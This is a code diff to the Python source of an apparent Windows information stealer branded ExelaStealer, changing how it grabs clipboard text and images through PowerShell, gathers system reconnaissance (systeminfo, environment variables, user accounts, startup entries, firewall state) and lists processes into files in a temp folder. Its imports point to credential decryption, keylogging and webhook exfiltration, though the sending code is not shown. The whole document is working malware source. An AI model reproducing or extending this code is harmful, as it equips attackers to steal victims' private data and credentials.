@@ -1,7 +1,6 @@
 import sqlite3, ctypes, mss, sys, ctypes, winreg, pygetwindow
 import os, wmi, win32api, platform, uuid, psutil, time, GPUtil
-import shutil, pythoncom, clipboard
-from PIL import ImageGrab
+import shutil, pythoncom
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
 from pynput import keyboard
@@ -687,25 +686,29 @@ class QuicaxdExela:
     def get_last_clipboard_text(self, path):
         try:
             pathsxd = os.getenv('temp') + "\\" + path
-            clipboard_data = clipboard.paste()
-            if not clipboard_data == "":
+            process = subprocess.run("powershell.exe Get-Clipboard", capture_output= True,shell= True)
+            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            if not output == "":
                 with open(pathsxd + "\\last_clipboard_text.txt", "a", encoding="utf-8", errors="ignore") as lst:
                     lst.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                    lst.write(clipboard_data)
+                    lst.write(output)
         except Exception as e:
             print(str(e))
     def get_last_clipboard_image(self, path):
         try:
-            pathsxd = os.getenv('temp') + "\\" + path
-            captured_image = ImageGrab.grabclipboard()
-            if captured_image:
-                saved_file = pathsxd + "\\last_clipboard_image.png"
-                captured_image.save(saved_file, "PNG")
+            pathsxd = os.getenv('temp') + "\\" + path + "\\last_clipboard_image.png"
+            powershell_command = f'''          
+            $clipboardData = Get-Clipboard -Format Image
+            $destinationPath = "{pathsxd}"
+            $clipboardData.Save($destinationPath)'''
+            subprocess.run(['powershell.exe', '-Command', powershell_command],capture_output=True, text=True)
         except Exception as e:
             print(str(e))
     def get_all_system_data(self):
         command = "wmic csproduct get uuid"
         run = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
+        process = subprocess.run(r"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Startup Info#### & wmic startup get caption,command & echo ####Firewallinfo#### & netsh firewall show state ", capture_output= True, shell= True)
+        output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
         tmp = os.getenv('temp')
         with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as x:
             x.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
@@ -752,6 +755,7 @@ class QuicaxdExela:
         except:
             pass
         with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as f:
+            f.write("Full Hardware information\n")
             f.write("CPU Info:\n")
             f.write(f"   Processor: {cpu_info.Name}\n")
             f.write(f"   Manufacturer: {cpu_info.Manufacturer}\n")
@@ -787,6 +791,7 @@ class QuicaxdExela:
                 f.write(f"   Used Space: {disk['Used Space']:.2f} GB\n")
                 f.write(f"   Free Space: {disk['Free Space']:.2f} GB\n")
                 f.write(f"   Usage Percentage: {disk['Usage Percentage']}%\n\n")
+                f.write(f"Full System Information\n{output}")
     def writeAllData(self):    
         command = "wmic csproduct get uuid"
         run = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
@@ -882,13 +887,13 @@ class QuicaxdExela:
             if 45 > 3:
                 self.get_all_system_data()
             if 7<15:
-                with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as file:
-                    for process in psutil.process_iter(['pid', 'name']):
-                        try:
-                            process_info = process.info
-                            file.write(f"Name: {process_info['name']} | PID: {process_info['pid']}\n")
-                        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                            pass
+                try:
+                    process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
+                    output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+                    with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as process_list:
+                        process_list.write(output)
+                except:
+                    pass
             if 0 < 1:
                 active_window_title = self.get_active_window_title()
                 with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
@@ -986,13 +991,13 @@ class QuicaxdExela:
             if 45 > 3:
                 self.get_all_system_data()
             if 7<15:
-                with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as file:
-                    for process in psutil.process_iter(['pid', 'name']):
-                        try:
-                            process_info = process.info
-                            file.write(f"Name: {process_info['name']} | PID: {process_info['pid']}\n")
-                        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                            pass
+                try:
+                    process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
+                    output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+                    with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as process_list:
+                        process_list.write(output)
+                except:
+                    pass
             if 0 < 1:
                 active_window_title = self.get_active_window_title()
                 with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
